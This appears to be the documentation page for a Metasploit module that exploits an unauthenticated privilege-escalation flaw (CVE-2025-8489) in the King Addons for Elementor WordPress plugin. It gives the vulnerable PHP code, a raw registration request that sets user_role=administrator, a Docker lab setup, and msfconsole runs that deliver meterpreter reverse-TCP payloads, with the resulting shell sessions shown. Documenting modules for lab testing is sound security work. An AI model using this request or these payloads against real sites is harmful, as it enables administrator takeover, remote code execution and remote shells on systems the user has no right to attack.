## Vulnerable Application

This Metasploit module exploits an unauthenticated privilege escalation vulnerability in the WordPress King Addons for Elementor plugin
(versions 24.12.92 to 51.1.14) (CVE-2025-8489). The vulnerability allows unauthenticated attackers to create administrator accounts
by specifying the `user_role` parameter during registration, enabling them to achieve remote code execution.

## Vulnerability Analysis

The plugin uses the `handle_register_ajax()` function in the `Login_Register_Form_Ajax` class to handle user registration. The vulnerable
code allows unauthenticated attackers to specify the `user_role` parameter without proper restrictions:

```php
$user_role = isset($_POST['user_role']) ? sanitize_text_field($_POST['user_role']) : 'subscriber';

// Set user role if provided
if (!empty($user_role) && $user_role !== 'subscriber') {
    $user_data['role'] = $user_role;
}
$user_id = wp_insert_user($user_data);
```

An attacker can send a POST request to `/wp-admin/admin-ajax.php` with the action `king_addons_user_register` and specify
`user_role=administrator` to create an administrator account:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=king_addons_user_register&nonce=794bfba24f&username=attacker&email=attacker@example.com&password=Password123!&confirm_password=Password123!&user_role=administrator&terms_required=no
```

Once an administrator account is created, the attacker can upload a malicious plugin for code execution.

**Affected versions**: 24.12.92 to 51.1.14 (Fixed in 51.1.35)
**Prerequisites**:
- Elementor must be installed and activated for the registration endpoint to be registered
- A WordPress page containing the King Addons "Login Register Form" Elementor widget must exist to expose the required nonce token
- User registration must be enabled in WordPress settings (`users_can_register` option)

## Docker Compose Configuration

```yaml
services:
  wordpress:
    image: wordpress:6.3.2
    container_name: wp-king-addons-lab
    restart: always
    ports:
      - 5556:80
    environment:
      WORDPRESS_DB_HOST: mysql
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    volumes:
      - wordpress:/var/www/html
    depends_on:
      - mysql

  mysql:
    image: mysql:5.7
    container_name: wp-king-addons-db
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

## Setup Instructions

```bash
docker compose up -d
sleep 5
docker exec wp-king-addons-lab bash -c "curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar && chmod +x wp-cli.phar && mv wp-cli.phar /usr/local/bin/wp"
alias wp="docker exec wp-king-addons-lab wp"
alias wp-user="docker exec -u www-data wp-king-addons-lab wp"
wp core install --path='/var/www/html' --url='http://localhost:5556' --title='Exploit Market' --admin_user='admin' --admin_password='admin' --admin_email='admin@example.com' --allow-root
wp rewrite structure '/%postname%/' --path='/var/www/html' --allow-root
wp rewrite flush --path='/var/www/html' --allow-root
wp config set FS_METHOD direct --path='/var/www/html' --allow-root
wp option update users_can_register 1 --path='/var/www/html' --allow-root
docker exec wp-king-addons-lab chown -R www-data:www-data /var/www/html/wp-content
wp-user plugin install elementor --version=3.21.0 --path='/var/www/html' --activate
wp-user plugin install king-addons --version=51.1.14 --path='/var/www/html' --activate --force
PAGE_ID=$(wp-user post create --post_type=page --post_status=publish --post_title='Register' --porcelain --path='/var/www/html')
ELEMENTOR_DATA='[{"elType":"section","settings":[],"elements":[{"elType":"column","settings":[],"elements":[{"elType":"widget","widgetType":"king-addons-login-register-form","settings":{"form_type":"register"}}]}]}]'
wp-user post meta update "$PAGE_ID" '_elementor_data' "$ELEMENTOR_DATA" --path='/var/www/html'
wp-user post meta update "$PAGE_ID" '_elementor_edit_mode' 'builder' --path='/var/www/html'
wp-user post meta update "$PAGE_ID" '_elementor_template_type' 'page' --path='/var/www/html'
wp-user post meta update "$PAGE_ID" '_wp_page_template' 'elementor_canvas' --path='/var/www/html'
wp-user cache flush --path='/var/www/html'
echo "Lab ready at http://localhost:5556/register/"
```

## Verification Steps

1. Start the environment and complete setup
2. Verify that the page with the widget is accessible and contains the nonce:
```bash
curl -s http://localhost:5556/register/ | grep -o "king_addons_login_register_vars"
```
3. Launch `msfconsole` and load the module: `use exploit/multi/http/wp_king_addons_privilege_escalation`
4. Set `RHOSTS` to target IP (use Docker gateway IP for `LHOST`)
5. Set `NONCE_PAGE` to the path of the page containing the widget (e.g., `/register/`)
6. Run the exploit: `run`

## Options

### NONCE_PAGE

Path to page containing King Addons Login Register Form widget (default: empty, must be set)

### USERNAME

Username for the administrator account to create

### PASSWORD

Password for the administrator account to create

### EMAIL

Email address for the administrator account to create

## Scenarios

### PHP Payload

```bash
use exploit/multi/http/wp_king_addons_privilege_escalation
set RHOSTS 127.0.0.1
set RPORT 5556
set NONCE_PAGE /register/
set USERNAME attacker
set PASSWORD Password123!
set EMAIL attacker@example.com
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 172.17.0.1
set LPORT 4444
run
```

**Expected Results:**

```plaintext
[*] Started reverse TCP handler on 172.17.0.1:4476 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (41224 bytes) to 172.28.0.3
[+] Deleted ajax_3am6b.php
[+] Deleted wp_pdzpk.php
[+] Deleted ../wp_pdzpk
[*] Meterpreter session 1 opened (172.17.0.1:4476 -> 172.28.0.3:51752) at 2025-12-04 01:12:50 +0100

meterpreter > sysinfo
Computer        : dc0748f28659
OS              : Linux
Architecture    : x64
System Language : C
Meterpreter     : php/linux
```

### Linux Meterpreter Payload

```bash
use exploit/multi/http/wp_king_addons_privilege_escalation
set RHOSTS 127.0.0.1
set RPORT 5556
set NONCE_PAGE /register/
set USERNAME attacker
set PASSWORD Password123!
set EMAIL attacker@example.com
set TARGET 1
set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
set LHOST 172.17.0.1
set LPORT 4445
run
```

**Expected Results:**

```plaintext
[*] Started reverse TCP handler on 172.17.0.1:4477 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (3090404 bytes) to 172.28.0.3
[+] Deleted ajax_wqukq.php
[+] Deleted wp_2qk83.php
[+] Deleted ../wp_2qk83
[*] Meterpreter session 1 opened (172.17.0.1:4477 -> 172.28.0.3:56698) at 2025-12-04 01:13:16 +0100

meterpreter > sysinfo
Computer     : dc0748f28659
OS           : Debian GNU/Linux 11 (bullseye)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
